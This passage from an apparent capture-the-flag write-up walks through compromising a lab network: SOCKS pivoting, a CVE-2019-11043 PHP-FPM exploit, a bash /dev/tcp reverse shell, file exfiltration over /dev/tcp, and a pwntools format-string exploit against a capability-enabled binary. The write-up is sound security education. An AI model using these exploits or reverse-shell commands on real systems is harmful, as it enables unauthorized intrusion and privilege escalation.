                curl_close($handle);
                echo $output;
                die();
        }
```

It’s using `curl` to connect to the pki host and returning the results (which I know from interacting with the site is the VPN config file).

The rest of the page is static HTML giving the table of hostnames / IPs.

`login.php` handles the two step login process with username / password then TOTP. It includes `database.php`, which has the connection info:

```php
<?php
$servername = "db";
$username = "root";
$password = "2108@C00l";
$dbname = "static";
?>
```

#### Tunneling

To check out the rest of the network, I’ll use SSH as a socks proxy with the `-D 9001` option. This will have my host listen on 9001 as a proxy. This enables setting FoxyProxy in FireFox or using `proxychains` with tools on my host, and from a networking point of view, it’s as if they are coming from within the network on web.

At the end of `/etc/proxychains.conf`, I’ll configure it to use this proxy:

```plaintext
[ProxyList]
socks4  127.0.0.1 9001
```

I’ll also configure a proxy in Burp, in the User Options –> Connections tab, under SOCKS Proxy:

![image-20210803093428048](https://0xdfimages.gitlab.io/img/image-20210803093428048.png)

Now any traffic going through Burp will then go through the SSH tunnel and then to its destination.

#### db

With creds to the DB, I’ll connect using `mysql` and `proxychains` from my host:

```console
oxdf@parrot$ proxychains mysql -h 172.20.0.11 -u root -p2108@C00l static
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9001-<><>-172.20.0.11:3306-<><>-OK
...[snip]...

MariaDB [static]>
```

There’s not a lot here. static is the only DB of interest, and there’s only one table with one row:

```console
MariaDB [static]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| static             |
+--------------------+
4 rows in set (0.020 sec)

MariaDB [static]> show tables
    -> ;
+------------------+
| Tables_in_static |
+------------------+
| users            |
+------------------+
1 row in set (0.022 sec)

MariaDB [static]> select * from users;
+----+----------+------------------------------------------+------------------+
| id | username | password                                 | totp             |
+----+----------+------------------------------------------+------------------+
|  1 | admin    | d033e22ae348aeb5660fc2140aec35850c4da997 | orxxi4c7orxwwzlo |
+----+----------+------------------------------------------+------------------+
1 row in set (0.021 sec)
```

#### pki

In my browser (configured to go through Burp which will then go through the SSH SOCKS proxy), visiting `http://192.168.254.3/` returns a single line of text:

![image-20210803093605823](https://0xdfimages.gitlab.io/img/image-20210803093605823.png)

`ersatool` is not a public tool that I could find.

If I add `?cn=something` to the end (which is what the PHP code on web did), it returns the VPN config:

![image-20210803093759680](https://0xdfimages.gitlab.io/img/image-20210803093759680.png)

Looking a the raw request and response in Burp, the `X-Powered-By` header shows a specific PHP version:

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 03 Aug 2021 13:43:17 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP-FPM/7.1
Content-Length: 53

batch mode: /usr/bin/ersatool create|print|revoke CN
```

It also shows that it’s likely executing `/usr/bin/ersatool` to create the keys.

### Command Injection [Fail]

Given the hint that the program is running a binary, my first thought was command injection. I tried a bunch things like `;`, `||`, `&`, etc. Nothing seemed to work. Eventually I tried putting a bunch of these characters in between known test strings:

![image-20210805083123396](https://0xdfimages.gitlab.io/img/image-20210805083123396.png)

All the special characters were removed. There’s clearly some kind of filtering going on, and I didn’t find a way around it (as I’ll see in a minute, there is no way around it).

### CVE-2019-11043

#### Background

[PHP-FPM](https://www.php.net/manual/en/install.fpm.php) is the FastCGI Process Manager for PHP. CGI (or [Common Gateway Interface](https://en.wikipedia.org/wiki/Common_Gateway_Interface)) is a specification for allowing web servers to execute an external program. As I already saw when visiting pki, it’s running some kind of program to generate a VPN config, so CGI makes sense here.

Googling for “PHP-FPM 7.1 exploit” returns a lot of results about CVE-2019-11043. [This blog post](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/php-fpm-vulnerability-cve-2019-11043-can-lead-to-remote-code-execution-in-nginx-web-servers) from TrendMicro does a nice job explaining the vulnerability. It’s a vulnerability in how NGINX interacts with PHP-FPM. In a typical NGINX config, there’s going to be a line like:

```bash
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
```

The attack involves putting a `%0a` (url-encoded newline) into the path so that NGINX will set the `env_path_info` variable to empty. PHP-FPM assumes that this will never be empty. By passing in a roughly 2000 byte URI, the attacker can make `path_info`, and manage to overwrite variables in memory to generate a persistent webshell.

#### POC

Googling “CVE-2019-11043 python” found [this GitHub](https://github.com/theMiddleBlue/CVE-2019-11043) repo with a POC. Because this generates a ton of connections, I opted for a direct connection rather than a SOCKs:

```console
oxdf@parrot$ ssh -i ~/keys/static-www-data-172.20.0.10 www-data@172.20.0.10 -L 9001:192.168.254.3:80
...[snip]...
```

Running the exploit takes a minute or two, as it’s trying different length requests to find the right overwrite in memory. Eventually, it finds it, and reports that a webshell is now in memory:

```console
oxdf@parrot$ python3 /opt/CVE-2019-11043/exploit.py --url http://127.0.0.1:9001/index.php
[*] QSL candidate: 1754, 1759, 1764
[*] Target seems vulnerable (QSL:1754/HVL:219): PHPSESSID=f73b39e0eda602d14224e4095b436f6c; path=/
[*] RCE successfully exploited!

    You should be able to run commands using:
    curl http://127.0.0.1:9001/index.php?a=bin/ls+/
```

Hitting the webshell returns a bunch of errors, but then the output of the command:

```console
oxdf@parrot$ curl http://127.0.0.1:9001/index.php?a=/bin/ls+/
[05-Aug-2021 00:43:52 UTC] PHP Warning:  Unknown: failed to open stream: No such file or directory in Unknown on line 0
[05-Aug-2021 00:43:52 UTC] PHP Fatal error:  Unknown: Failed opening required 'a' (include_path='/tmp') in Unknown on line 0
[05-Aug-2021 00:43:53 UTC] PHP Warning:  Unknown: failed to open stream: No such file or directory in Unknown on line 0
[05-Aug-2021 00:43:54 UTC] PHP Warning:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2
...[snip]...
[05-Aug-2021 00:44:14 UTC] PHP Warning:  Unknown: Unable to load dynamic library 'bin
boot
dev
entry.sh
etc
home
lib
lib64
media
mnt
opt
php-src
proc
root
run
sbin
srv
sys
tmp
usr
var
' - bin
boot
dev
entry.sh
etc
home
lib
lib64
media
mnt
opt
php-src
proc
root
run
sbin
srv
sys
tmp
usr
var
: cannot open shared object file: No such file or directory in Unknown on line 0
[05-Aug-2021 00:44:14 UTC] PHP Warning:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2
[05-Aug-2021 00:44:36 UTC] PHP Warning:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2
[05-Aug-2021 00:44:47 UTC] PHP Warning:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2

Warning: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2
batch mode: /usr/bin/ersatool create|print|revoke CN
```

This webshell was very unstable. Sometimes I had to refresh the page five or six times to see a result. I also tried a [version of the exploit](https://github.com/neex/phuip-fpizdam) written in Go that gave better information about what was going on. I got the binary with `go get github.com/neex/phuip-fpizdam`, and then ran it:

```console
oxdf@parrot$ ~/go/bin/phuip-fpizdam http://127.0.0.1:9001/index.php
2021/08/05 08:01:05 Base status code is 200
2021/08/05 08:01:07 Status code 502 for qsl=1765, adding as a candidate
2021/08/05 08:01:07 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2021/08/05 08:01:09 Attack params found: --qsl 1755 --pisos 38 --skip-detect
2021/08/05 08:01:09 Trying to set "session.auto_start=0"...
2021/08/05 08:01:10 Detect() returned attack params: --qsl 1755 --pisos 38 --skip-detect <-- REMEMBER THIS
2021/08/05 08:01:10 Performing attack using php.ini settings...
2021/08/05 08:01:11 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2021/08/05 08:01:11 Trying to cleanup /tmp/a...
2021/08/05 08:01:11 Done!
```

Typically I like to move to `curl` once I get a webshell working, but here I’ll use Firefox as it allows me to just Ctrl-Shift-R quickly to run until I see results.

![image-20210805080950176](https://0xdfimages.gitlab.io/img/image-20210805080950176.png)

#### Connectivity

I tried to get pki to ping both my tun0 address (10.10.14.19) and and my tun9 address (172.30.0.9). Neither reached my host. It seems that pki can’t connect back.

![image-20210805081023088](https://0xdfimages.gitlab.io/img/image-20210805081023088.png)

![image-20210805081052255](https://0xdfimages.gitlab.io/img/image-20210805081052255.png)

I can ping web:

![image-20210805081122990](https://0xdfimages.gitlab.io/img/image-20210805081122990.png)

Perhaps there is an outbound firewall rule blocking certain connections.

#### Looking for Tools on pki

To figure out how to create a reverse shell, I need to know what tools on are pki. Because `which` returns nothing if the tool isn’t found in the current path, I’ll use the command `which [command] || echo "not found"`, so that I can refresh quickly until I see a path or “not found”. I’ll start with `id` since that should be on the box, and it is:

![image-20210805081425143](https://0xdfimages.gitlab.io/img/image-20210805081425143.png)

`curl` is not:

![image-20210805081455170](https://0xdfimages.gitlab.io/img/image-20210805081455170.png)

`wget`, `nc`, and `python` are not either. `bash` is at `/bin/bash`. `python3` and `perl` are both present as well.

#### Shell

web doesn’t have `nc`. I’ll grab a statically compiled copy from [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat), and `scp` it to web:

```console
oxdf@parrot$ scp -i ~/keys/static-www-data-172.20.0.10 ncat www-data@172.20.0.10:/tmp/nc
ncat                                    100% 2846KB   3.8MB/s   00:00
```

I can’t listen on 443 as a non-root user, so I’ll pick a high port:

```console
www-data@web:~$ /tmp/nc -lnvp 4433
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::4433
Ncat: Listening on 0.0.0.0:4433
```

I’ll first try a Bash reverse shell (with the `&` encoded as `%26` to not confuse the web request):

```plaintext
http://127.0.0.1:9001/index.php?a=bash -c 'bash -i >%26 /dev/tcp/192.168.254.2/4433 0>%261'
```

After a few refreshes, it connected back:

```console
www-data@web:~$ /tmp/nc -lnvp 4433
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::4433
Ncat: Listening on 0.0.0.0:4433
Ncat: Connection from 192.168.254.3.
Ncat: Connection from 192.168.254.3:39820.
bash: cannot set terminal process group (14): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pki:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Even though it’s running on web, the normal PTY trick works:

```console
www-data@pki:~/html$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
www-data@pki:~/html$ ^Z
[1]+  Stopped                 /tmp/nc -lnvp 4433
www-data@web:~$ stty raw -echo; fg
/tmp/nc -lnvp 4433
                  reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@pki:~/html$
```

## Shell as root

### Enumeration

Looking at the webpage, it’s super simple:

```php
<?php
header('X-Powered-By: PHP-FPM/7.1');
//cn needs to be parsed!!!
$cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_GET['cn']);
echo passthru("/usr/bin/ersatool create ".$cn);
?>
```

It scrubs the input of all characters that aren’t letters, numbers or space, and runs `/usr/bin/erasatool create $cn`, printing the results.

That binary doesn’t look special at first glance:

```console
www-data@pki:~/html$ ls -l /usr/bin/ersatool
-rwxr-xr-x 1 root root 22496 Jun 21 17:05 /usr/bin/ersatool
```

There’s also a `ersatool.c` file in `/usr/src` that is likely the source for the application.

```console
www-data@pki:~/html$ ls /usr/src/
ersatool.c
```

Looking through the source, there are two places where it calls `setuid`. For example, in the `filePrint` function:

```c
void filePrint(char *filename){
        int bfsiz=1;
        char buffer[bfsiz];
        int fd;
        ssize_t fr;
        memset(buffer,0,bfsiz);
        setuid(0); //escalating privileges to read root owned files
        if((fd=open(filename,O_RDONLY))<0){
                printf("[!] ERR reading %s!\n",filename);
        }
        while(fr=read(fd,buffer,bfsiz)>0){
                printf("%s",buffer);
                memset(buffer,0,bfsiz);
        }
        close(fd);
        fflush(stdout);
}
```

That raises a question - how can it make that call? It would need to be running as root, or somehow be given that capability. I already looked, and while the file is owned by root, it isn’t SUID. It is being called by NGINX, but that process is running as www-data, as evidenced by my current shell, as well as the process list:

```console
www-data@pki:~/html$ ps auxww
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.0   4628   856 ?        Ss   11:40   0:00 /bin/sh -c /entry.sh
root          9  0.0  0.0  18376  3056 ?        S    11:40   0:00 /bin/bash /entry.sh
root         11  0.0  0.0 141120  1572 ?        Ss   11:40   0:00 nginx: master process nginx
www-data     12  0.0  0.1 141776  5076 ?        S    11:40   0:02 nginx: worker process
www-data     13  0.0  0.0 141440  3480 ?        S    11:40   0:00 nginx: worker process
root         14  0.0  0.3  84952 12824 ?        Ss   11:40   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
www-data     15  0.0  0.2  85216  9384 ?        S    11:40   0:01 php-fpm: pool www
www-data     19  0.0  0.2  85216  9388 ?        S    11:40   0:01 php-fpm: pool www
www-data    128  0.0  0.2  85224 10080 ?        S    12:04   0:02 php-fpm: pool www
www-data    636  0.0  0.2  85220  9512 ?        S    12:05   0:01 php-fpm: pool www
www-data  11226  0.0  0.2  85220  9512 ?        S    12:07   0:00 php-fpm: pool www
www-data  14776  0.0  0.0   4628   860 ?        S    12:22   0:00 sh -c bash -c 'bash -i >& /dev/tcp/192.168.254.2/4433 0>&1'
www-data  14777  0.0  0.0  18376  3112 ?        S    12:22   0:00 bash -c bash -i >& /dev/tcp/192.168.254.2/4433 0>&1
www-data  14778  0.0  0.0  18508  3472 ?        S    12:22   0:00 bash -i
www-data  14782  0.0  0.2  36668  8608 ?        R    12:25   0:00 python3 -c import pty;pty.spawn("bash")
www-data  14783  0.0  0.0  18508  3440 pts/0    Ss   12:25   0:00 bash
www-data  14914  0.0  0.0  34404  2948 pts/0    R+   13:18   0:00 ps auxww
```

It could be running on a cron periodically, but then it would still fail when the webapp calls it. The binary has the `setuid` capability:

```console
www-data@pki:~$ getcap /usr/bin/ersatool
/usr/bin/ersatool = cap_setuid+eip
```

So if there’s some way to exploit this binary and get it to run code, I can get root in this container.

### Exfil

To look at the binary, I need to get a copy back to my VM. One option would be to base64 encode it and then just copy and paste it. Alternatively, I can send it to web, and then `scp` back to my host. I’ll start `nc` listening on web, pipe the file into `/dev/tcp` on pki:

```console
www-data@pki:~$ cat /usr/src/ersatool.c > /dev/tcp/192.168.254.2/4444
```

It arrives at web:

```console
www-data@web:~$ /tmp/nc -lnvp 4444 > /tmp/0xdf
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.254.3.
Ncat: Connection from 192.168.254.3:45386.
```

Now I’ll pull that to my host:

```console
oxdf@parrot$ scp -i ~/keys/static-www-data-172.20.0.10 www-data@172.20.0.10:/tmp/0xdf ersatool.c
0xdf                                                 100% 5729   272.0KB/s   00:00
```

I’ll do the same with `ersatool`, and then check the hashes on both:

```console
www-data@pki:~$ md5sum /usr/bin/ersatool /usr/src/ersatool.c
9ac82feda66338eafaf2dc6e1d602131  /usr/bin/ersatool
d258f3c0bf1945e43314617de8f83dd1  /usr/src/ersatool.c
```

```console
oxdf@parrot$ md5sum ersatool*
9ac82feda66338eafaf2dc6e1d602131  ersatool
d258f3c0bf1945e43314617de8f83dd1  ersatool.c
```

### Format String Exploit

#### Background

I always recommend the three part video series by LiveOverflow on format strings as a good place to get started ([1](https://www.youtube.com/watch?v=0WvrSfcdq1I), [2](https://www.youtube.com/watch?v=kUk5pw4w0h4), and [3](https://www.youtube.com/watch?v=t1LH9D5cuK4)). I also went a bit into this in [Rope](https://0xdf.gitlab.io/2020/05/23/htb-rope.html#format-string-vulnerabilities).

A format string vulnerability occurs when a program calls a function like `printf` on just a variable. The idea is that the first argument for `printf` will be a format string, containing 0 or more “specifiers” (described [on cplusplus.com](https://www.cplusplus.com/reference/cstdio/printf/)). So you might see something like `printf("hello %s", name)` used to print a user’s name. If just a variable is passed, while the intention is to just print the variable, the result is that the variable is processed just like the static string above. Furthermore, if the given string has more specifiers than are giving, it will just continue reading them memory from the stack where they would have been had they been passed. This kind of mismatch isn’t typically coded in, but if there’s a call to `printf(variable)`, then the string in `variable` is treated as the formatting string, which means I can leak memory.

There’s also a specifier, `%n`, that doesn’t read, but writes the number of bytes printed up to this point in the string to the address passed in. That means if I can reference something I pass in, I can arbitrarily write memory.

#### Protections

Unsurprisingly, the box has ASLR enabled:

```console
www-data@pki:~$ cat /proc/sys/kernel/randomize_va_space
2
```

The binary is running with some protections:

```console
oxdf@parrot$ checksec ersatool
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`NX` means I can’t write to the stack and then execute from it, and `PIE` means that the addresses of not just the libraries but also the main program will be moving in memory, and that I’ll need a address leak in order to meaningfully interact with memory.

#### Identify Format String Vuln

The first thing that jumped out at me looking at the code was this line in `printCN`:

```c
printf(buffer); //checking buffer content
```

That’s calling `printf` on a buffer without a format string. If that buffer is user controlled, then it can be used to leak and write memory.

I’ll use `%p` to print 64-bit pointers, with `016` to zero-pad the results and a `.` to create spacing:

```console
oxdf@parrot$ ./ersatool print %016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p
0x0056378a09d15f.0x00000000000005.0x000000006e7076.0x00000000000014.0x007ffcfbb9fed0.           (nil).0x007ffcfbba21b2.0x30252e7036313025.0x363130252e703631.0x2e70363130252e70[!] ERR reading /opt/easyrsa/clients/%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.ovpn!
oxdf@parrot$ ./ersatool print %016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p
0x005577868eb15f.0x00000000000005.0x000000006e7076.0x00000000000014.0x007ffd447d6170.           (nil).0x007ffd447d81b2.0x30252e7036313025.0x363130252e703631.0x2e70363130252e70[!] ERR reading /opt/easyrsa/clients/%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.ovpn!
oxdf@parrot$ ./ersatool print %016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p
0x00563ff8e7a15f.0x00000000000005.0x000000006e7076.0x00000000000014.0x007fffbd26ca20.           (nil).0x007fffbd26e1b2.0x30252e7036313025.0x363130252e703631.0x2e70363130252e70[!] ERR reading /opt/easyrsa/clients/%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.ovpn!
```

There’s a few things that jump out here:

- By running it a couple times, I can tell which memory addresses are impacted by ASLR/PIE and which are not. For example, in the first words, the low three characters (nibbles) and high three nibbles are staying constant, but the rest is changing. The fifth word is keeping the high five and lowest nibbles constant, and changing the rest. If I had to guess, the fifth is a stack address, and the first is some kind of global.
- The eighth word contains my input, 0x25 (`%`), 0x30 (`0`), 0x31 (`1`), 0x36 (`6`), 0x70 (`p`), 0x2e (`.`), etc. This makes sense, as the format string is on the stack as well.

#### Identify Pointers

If I can identify a constant distance in memory between one of these pointers and something I want to write to, I can use this leak to calculate that address, and then I’ll have a file write.

I’ll open `gdb` with `gdb ersatool`, and look at the `printCN` function with `disassemble printCN`. In the source, around the print, it does a bunch of `strncpy`, `strncat`, `strlen` calls just before the `printf`, and then a call to `filePrint`:

```c
 47         strncpy(fn, OUTPUT_DIR,sizeof(fn));
 48         strncat(fn, "/",sizeof(fn)-strlen(fn));
 49         strncat(fn, strtok(basename(buffer),"\n"),sizeof(fn)-strlen(fn));
 50         strncat(fn, EXT, sizeof(fn)-strlen(fn));
 51         printf(buffer); //checking buffer content
 52         filePrint(fn);
```

The vulnerable `printf` must be 396 bytes into the function:

```plaintext
   0x0000000000001406 <+337>:   call   0x10e0 <strncat@plt>
   0x000000000000140b <+342>:   lea    rax,[rbp-0x80]
   0x000000000000140f <+346>:   mov    rdi,rax
   0x0000000000001412 <+349>:   call   0x1070 <strlen@plt>
   0x0000000000001417 <+354>:   mov    edx,0x64
   0x000000000000141c <+359>:   sub    rdx,rax
   0x000000000000141f <+362>:   lea    rax,[rbp-0x80]
   0x0000000000001423 <+366>:   lea    rsi,[rip+0x3d35]        # 0x515f <EXT>
   0x000000000000142a <+373>:   mov    rdi,rax
   0x000000000000142d <+376>:   call   0x10e0 <strncat@plt>
   0x0000000000001432 <+381>:   lea    rax,[rbp-0xf0]
   0x0000000000001439 <+388>:   mov    rdi,rax
   0x000000000000143c <+391>:   mov    eax,0x0
   0x0000000000001441 <+396>:   call   0x10b0 <printf@plt>
   0x0000000000001446 <+401>:   lea    rax,[rbp-0x80]
   0x000000000000144a <+405>:   mov    rdi,rax
   0x000000000000144d <+408>:   call   0x14e3 <filePrint>
   0x0000000000001452 <+413>:   cmp    DWORD PTR [rbp-0xfc],0x1
   0x0000000000001459 <+420>:   jne    0x14ad <printCN+504>
```

I’ll add a break a couple instructions later and run it:

```console
gdb-peda$ b *printCN+401
Breakpoint 1 at 0x1446
gdb-peda$ r print %016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p
```

It hits the break point just after printing the results:

```console
0x0055555555915f.0x00000000000005.0x000000006e7076.0x00000000000014.0x007fffffffdbf0.           (nil).0x007fffffffe154.0x30252e7036313025.0x363130252e703631.0x2e70363130252e70[!] ERR reading /opt/easyrsa/clients/%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.ovpn!
...[snip]...
Breakpoint 1, 0x0000555555555452 in printCN ()
gdb-peda$
```

I can examine what’s in memory at some of these addresses:

```console
gdb-peda$ x/s 0x0055555555915f
0x55555555915f <EXT>:   ".ovpn"
gdb-peda$ x/s 0x007fffffffdbf0
0x7fffffffdbf0: "/opt/easyrsa/clients/%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.ovpn"
gdb-peda$ x/s 0x007fffffffe154
0x7fffffffe154: "%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p"
```

The first word is the pointer to the string “.ovpn”. `gdb` is nice enough to tell me it’s the `EXT` variable, which is a global variable defined here in the source:

```c
 12 //easyrsa configuration
 13 char ERSA_DIR[]="/opt/easyrsa";
 14 char TA_KEY[]="/opt/easyrsa/clients/ta.key";
 15 char OUTPUT_DIR[]="/opt/easyrsa/clients";
 16 char BASE_CONFIG[]="/opt/easyrsa/clients/base.conf";
 17 char EXT[]=".ovpn";
```

`gdb` will let me print it by variable name as well:

```console
gdb-peda$ x/s &EXT
0x55555555915f <EXT>:   ".ovpn"
```

The other variables in this block sit right before it:

```console
gdb-peda$ x/s &BASE_CONFIG
0x555555559140 <BASE_CONFIG>:   "/opt/easyrsa/clients/base.conf"
```

So I will know the address of all of these constants.

The next variable I looked at was 0x7fffffffdbf0. The resulting string is what’s generated here:

```c
 47         strncpy(fn, OUTPUT_DIR,sizeof(fn));
 48         strncat(fn, "/",sizeof(fn)-strlen(fn));
 49         strncat(fn, strtok(basename(buffer),"\n"),sizeof(fn)-strlen(fn));
 50         strncat(fn, EXT, sizeof(fn)-strlen(fn));
```

So I’m looking at `fn`. Because `fn` is defined at the top of this function, it will live on the stack. So I can confidently leak stack addresses as well.

The third address, 0x007fffffffe154, is another string on the stack.

#### Target

At this point, I’ve found a way to break past ASLR and PIE and orient in memory. I also know that with a format string vuln I can write to specific addresses. So what do I want to overwrite. The generic case is to go for a return address and then jump back to a ROP chain on the stack, or a function in the GOT table where I can then pass my input to `system`. But there’s an issue with that - I need to do it after `setuid(0)` is called.

Luckily for me, there’s an attackable `system` call just after one of the `seduid` calls in `createCN`:

```c
114             char *a[] = {EASYRSA,"build-client-full",strtok(basename(buffer),"\n"),"nopass","batch"};
115             //forge the command string
116             cleanStr(a[2]);
117             sprintf(CMD,"%s %s %.20s %s %s",a[0],a[1],a[2],a[3],a[4]);
118             sout=dup(STDOUT_FILENO);
119             serr=dup(STDERR_FILENO);
120             devNull=open("/dev/null",O_WRONLY);
121             dup2(devNull,STDOUT_FILENO);
122             dup2(devNull,STDERR_FILENO);
123             setuid(0); //escalating privilges to generate required files
124             chdir(ERSA_DIR);
125             system(CMD);
126             exit(0);
```

`CMD` is passed to `system` on line 125, just after `setuid(0)` on 123. `CMD` is defined by the `sprintf` call on 117, where the first argument is `EASYRSA`. `EASYRSA` is a local variable for this function, and it’s set at the top of the function:

```c
 94     memset(EASYRSA,0,sizeof(EASYRSA));
 95     strcat(EASYRSA,ERSA_DIR);
 96     strcat(EASYRSA,"/easyrsa");
```

Basically it’s the global `ERSA_DIR` + “/easyrsa”. This means that if I can overwrite the `ERSA_DIR` variable with a different path that I can write to, I can drop a Bash script named `easyrsa` to that dir and it will be run as root.

I will need to switch to running the tool in interactive mode, with no arguments, so that I can overwrite the memory with the `printCN` call, and then trigger it with `createCN`.

#### Script Leak

I want to leak the address of `ERSA_DIR`, which means I need to know the offset from `ETX`. In `gdb` I can print both addresses:

```console
gdb-peda$ x/s &EXT
0x55555555915f <EXT>:   ".ovpn"
gdb-peda$ x/s &ERSA_DIR
0x5555555590f0 <ERSA_DIR>:      "/opt/easyrsa"
```

Or I can just print the difference:

```console
gdb-peda$ p &EXT - &ERSA_DIR
warning: Type size unknown, assuming 1. Try casting to a known type, or void *.
$9 = 0x6f
```

I’ll start a script that will handle using the format vuln to leak the address of `ERSA_DIR`:

```python
#!/usr/bin/env python3

from pwn import *

p = process('./ersatool')

p.recv(64)               # read # prompt
p.sendline(b"print")     # enter print menu
p.recvuntil(b"CN=")      # read up to CN= prompt
p.sendline(b"%016p")     # get first pointer from the stack
leak = p.recv(1024)
ext_addr = int(leak.split(b'[')[0], 16)
ersa_dir_addr = ext_addr - 0x6f

log.success(f'Leaked EXT address:          0x{ext_addr:016x}')
log.success(f'Calculated ERSA_DIR address: 0x{ersa_dir_addr:016x}')

p.interactive()
```

I have the `p.interactive()` at the end so that the process doesn’t die, and I can connect `gdb` to it and verify the results. When I run, it prints what looks like a good leak:

```console
oxdf@parrot$ python3 root.py
[+] Starting local process './ersatool': pid 540189
[+] Leaked EXT address:          0x00005648ade1615f
[+] Calculated ERSA_DIR address: 0x00005648ade160f0
[*] Switching to interactive mode
$
```

Running `sudo gdb -p $(pidof ersatool)` will attach `gdb` to that pid, and it worked:

```console
gdb-peda$ p &ERSA_DIR
$1 = (<data variable, no debug info> *) 0x5648ade160f0 <ERSA_DIR>
```

#### POC Write Memory

The next thing I need to do is write memory to a known address. With all of the other specifiers, they read a value or a string and put it into the string. `%n` is different. It takes an address, and writes to that address the number of bytes output so far.

I want the `%n` to read the address of `ERSA_DIR`, so I’ll exploit the format string vuln again, this time with that address on the stack in a place I can reference it. I already noted it above, but it’s more clear with `AAAAAAAA%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p` as input:

```plaintext
print->CN=AAAAAAAA%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p.
AAAAAAAA0x005602a095415f.0x00000000000005.0x000000006e7076.0x00000000000017.0x007ffee58fbb10.0x000001a09501d0.           (nil).0x4141414141414141.[!] ERR reading /opt/easyrsa/clients/AAAAAAAA%016p.%016p.%016p.%016p.%016p.%016p.%016p.%016p..ovpn!
```

The eighth word has all 0x41, which is “A”. I can reference the eighth word by `%8$p`:

```plaintext
print->CN=AAAAAAAA%8$p
AAAAAAAA0x4141414141414141[!] ERR reading /opt/easyrsa/clients/AAAAAAAA%8$p.ovpn!
```

That replaces `%8$p` with the eighth argument on the stack, which happens to be the string of As.

The next logical step would be to replace the eight As with the address of `ERSA_DIR` and try to print that back, but it didn’t work. That’s because the first couple bytes in the address of `ERSA_DIR` are null, and thus they terminate the string. The format string is [defined](https://man7.org/linux/man-pages/man3/printf.3.html) as a “character string”, and it’s undefined how to handle null bytes, but it makes sense that when it hits these null bytes the string is treated as complete (since null bytes mark the end of a string).

To get around this, I’ll put the address at the end of the string. I want this address to be at a fixed point relative to my input, even if my input changes, so I’ll create a fixed length of space for various format strings, and then put the address, and try to print it. After some playing around, I found that with 64 bytes for format string and then the address, the address was the 16th argument:

```console
print->CN=%16$016pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
0x4242424242424242AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB[!] ERR reading /opt/easyrsa/clients/%16$016pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB.ovpn!
```

This gives me a lot of space to change the start of the payload, and as long as I adjust the padding, the address (right now `BBBBBBBB`) will stay in the same place. I can use this template, replacing the As with other specifiers as needed, and leave the address at that offset, and now know how to reference it.

I’ll add this line before the last `p.interactive()` line in my script:

```python
p.sendline("%16$20p".ljust(64, '.').encode() + p64(ersa_dir_addr))
```

It works:

```console
oxdf@parrot$ python3 root.py
[+] Starting local process './ersatool': pid 543293
[+] Leaked EXT address:          0x0000558319fe215f
[+] Calculated ERSA_DIR address: 0x0000558319fe20f0
[*] Switching to interactive mode
      0x558319fe20f0.........................................................\xf0 \xfe\x83U[!] ERR reading /opt/easyrsa/clients/%16$20p.........................................................\xf0 \xfe\x83U.ovpn!

print->CN=$
```

The output line has a 20 character address padded with spaces followed by periods as filler until it reaches the address I passed in, stopping a the null bytes.

I’ll change the line a bit now:

```python
p.sendline("%16$20p%16$n".ljust(64, '.').encode() + p64(ersa_dir_addr))
```

Running this prints the same thing:

```console
oxdf@parrot$ python3 root.py
[+] Starting local process './ersatool': pid 545730
[+] Leaked EXT address:          0x00005640f813e15f
[+] Calculated ERSA_DIR address: 0x00005640f813e0f0
[*] Switching to interactive mode
0x5640f813e0f0....................................................\xf0\xe0\xf8@V[!] ERR reading /opt/easyrsa/clients/%16$20p%16$n....................................................\xf0\xe0\xf8@V.ovpn!

print->CN=$
```

